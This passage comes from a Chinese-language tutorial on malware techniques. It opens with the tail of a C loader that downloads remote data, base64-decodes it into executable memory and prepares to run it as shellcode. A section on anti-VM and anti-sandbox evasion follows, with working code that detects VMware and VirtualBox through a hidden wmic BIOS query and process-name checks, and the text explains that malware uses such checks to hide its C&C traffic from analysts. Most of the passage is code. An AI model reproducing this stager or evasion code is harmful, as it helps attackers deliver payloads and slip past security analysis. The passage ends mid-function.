                fprintf(stderr, "HttpQueryInfo failed, error = %d (0x%x)\n",
                    GetLastError(), GetLastError());
                break;
            }
        }
        pInfoBuffer[dwInfoBufferLength] = '\0';
        pInfoBuffer[dwInfoBufferLength + 1] = '\0';
        //printf("%S", pInfoBuffer); 
        free(pInfoBuffer);
        DWORD dwBytesAvailable;
        //读取raw数据
        while (InternetQueryDataAvailable(hRequest, &dwBytesAvailable, 0, 0))
        {
            pMessageBody = (BYTE *)malloc(dwBytesAvailable+1);
            DWORD dwBytesRead;
            BOOL bResult = InternetReadFile(hRequest, pMessageBody,
                dwBytesAvailable, &dwBytesRead);
            if (!bResult)
            {
                fprintf(stderr, "InternetReadFile failed, error = %d (0x%x)\n",
                    GetLastError(), GetLastError());
                goto SAFE_EXIT;
            }
            if (dwBytesRead == 0)
            {
                break; 
            }
            pMessageBody[dwBytesRead] = '\0';
            strcat((char*)pAllData, (char*)pMessageBody);
            free(pMessageBody);
        }
        printf((char*)pAllData);
        //base64 解码, 跳过开头的forTEST{}
        if(base64_decode((char*)pAllData + 8, strlen((char*)pAllData) - 9, (char*)pDecodeData, 4096))
        {
            goto SAFE_EXIT;
        }
        decode_len = strlen((char*)pDecodeData);
        //进一步将字符串转为16进制值
        pCode = (BYTE*)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (pCode == NULL)
        {
            goto SAFE_EXIT;
        }
        for (int i = 0; i 
### 3、虚拟化和沙箱的检测
#### 原理及代码介绍
恶意软件分析人员经常会使用隔离的环境（如 虚拟机、沙箱）来分析未知程序中的 **恶意代码**
，为了逃避分析并绕过安全系统检测，恶意软件作者通常会添加代码来检测目前是否运行在隔离的环境。一旦检测到这种环境，恶意软件就可以阻止恶意代码运行，或者可以改变恶意软件的行为，从而避免在VM中运行时暴露恶意活动。
例如：在真实硬件上运行时，恶意软件将连接到其C&C服务器，但是在检测到VM时，它将连接到合法域名，从而使分析人员或自动安全检测系统认为这是合法代码。
攻击者可以通过搜索安全监测工具（例如Sysinternals，Wireshark等）来确定目前是否为分析环境。通过搜索流行的虚拟化方案的 **固有特征**
以监测是否运行在虚拟化环境中， 如搜索VMTools进程是否存在以确认是否在VMWare中运行。在恶意代码中使用计时器或循环，来监测代码是否在沙箱中运行。
虚拟机软件主要是模仿真实硬件的硬件功能，但是通常会在操作系统中存在一些特征，这有助于表明它确实是虚拟机而不是物理机。这些特征可能是特定的文件、进程、注册表项、服务或者是网络设备适配器等等。利用这一“设计缺陷”，编码以检测虚拟机配置文件、可执行文件、注册表项或其他特征，从而操纵其原始执行流程。此行为称为“反沙箱”或“反VM”。Att&ck中列举了多种策略，恶意软件使用这些策略来检查流行的沙箱和虚拟环境，下面笔者将以一些常规策略为例，介绍其检测手法及代码实现的原理。
##### 通过WMI 检查主板信息及BIOS信息，以确认是否在虚拟机中运行
在虚拟机中安装的操作系统， 由于其部分硬件为虚构出来的，
有不少硬件存在固定的特征，可以利用该特征来确认是否运行于虚拟机中。如BIOS信息、硬盘信息。众所周知，通过Windows系统中WMI提供的接口可以查询到操作系统中绝大多数的相关信息。如下图所示，通过命令行调用WMIC在使用WMI查询硬盘信息，可以确认，默认的虚拟机中其硬盘名称中包含Vmware
字样，而真实物理机中通常不含这样的信息：
进一步查询BIOS 的编号，不难发现其编号中也有Vmware字样，而真实物理机中却不包含。
我们完全可以以这样的差异，用于检测代码是否运行在虚拟系统中，如下的代码演示了通过新建命令行程序并执行查询BIOS编号，通过检查其中是否有Vmware字符串来确定是否允许于Vmware虚拟机中，同理，读者可以尝试一下在其他诸如VirtualBox的虚拟化环境中是否有这样的特征.
    /*
        通过WMI查询， 检查主板信息和BIOS信息，以确认是否在VM中运行
    */
    bool checkvm_by_wmiinfo()
    {
        bool ret = false;
        DWORD cb = 0;
        DWORD need_read_cb;
        DWORD data_avail;
        HANDLE new_process;
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        HANDLE read_pipe_handle, write_pipe_handle;   
        SECURITY_ATTRIBUTES sa_attr; 
        BYTE read_buffer[0x1000];
        sa_attr.nLength = sizeof(SECURITY_ATTRIBUTES); 
        sa_attr.bInheritHandle = TRUE; 
        sa_attr.lpSecurityDescriptor = NULL; 
        if(!CreatePipe(&read_pipe_handle, &write_pipe_handle, &sa_attr, 0))
        {
            goto Error_Exit;
        }
        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));
        GetStartupInfo(&si);
        si.cb = sizeof(si);
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = write_pipe_handle;
        si.hStdError = write_pipe_handle;
        if (!CreateProcess(_TEXT("c:\\windows\\system32\\cmd.exe"), _TEXT("\/c wmic bios get serialnumber"), NULL, 
            NULL, TRUE, NULL, NULL, NULL, &si, &pi))
        {
            goto Error_Exit;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        do 
        {
            if (!PeekNamedPipe(read_pipe_handle, NULL, NULL, &need_read_cb, &data_avail, NULL) || data_avail <= 0)
            {
                break;
            }
            if (!ReadFile(read_pipe_handle, read_buffer,data_avail, &cb, NULL))
            {
                goto Error_Exit;
            }
            //读取的 read_buffer 可能为unicode 编码!!!
            if(strstr((char*)read_buffer, ("VMware")) != NULL)
            {
                ret = true;
                break;
            }
        } while (true);
    Error_Exit:
        if(read_pipe_handle != NULL)
        {
            CloseHandle(read_pipe_handle);
            read_pipe_handle = NULL;
        }
        if(write_pipe_handle != NULL)
        {
            CloseHandle(write_pipe_handle);
            write_pipe_handle = NULL;
        }
        if(pi.hProcess != NULL)
        {
            CloseHandle(pi.hProcess);
        }
        if (pi.hThread != NULL)
        {
            CloseHandle(pi.hThread);
        }
        return ret;
    }
##### 搜索系统中的进程名称，通过检查是否正在运行有流行虚拟机的特有进程，来检查是否运行在虚拟机中
虚拟机为了实现某些功能，通常需要在虚拟的系统中安装一些程序，通过这些程序配合宿主机中安装的程序来完成，如下图所示的vmtoolsd进程，即为VMware实现拖拽功能所须安装的程序，通常情况下，虚拟机都会安装该程序以实现真机和虚拟机的无缝拖拽功能。
    /*
    搜索系统中的进程名称，通过检查流行虚拟机的特有进程，来检查是否运行在虚拟机中
    */
    bool checkvm_by_process()
    {
        bool ret = false;
        HANDLE process_snap;
        PROCESSENTRY32 pe32;
        process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (process_snap == INVALID_HANDLE_VALUE)
        {
            goto Error_Exit;
        }
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(process_snap, &pe32))
        {
            goto Error_Exit;
        }
        do 
        {
            if ((lstrcmp(pe32.szExeFile, _TEXT("vmtoolsd.exe")) == 0) ||
                (lstrcmp(pe32.szExeFile, _TEXT("vmwaretrat.exe")) == 0)||
                (lstrcmp(pe32.szExeFile, _TEXT("vmwareuser.exe")) == 0)||
                (lstrcmp(pe32.szExeFile, _TEXT("vmacthlp.exe")) == 0)||
                (lstrcmp(pe32.szExeFile, _TEXT("vboxservice.exe")) == 0)||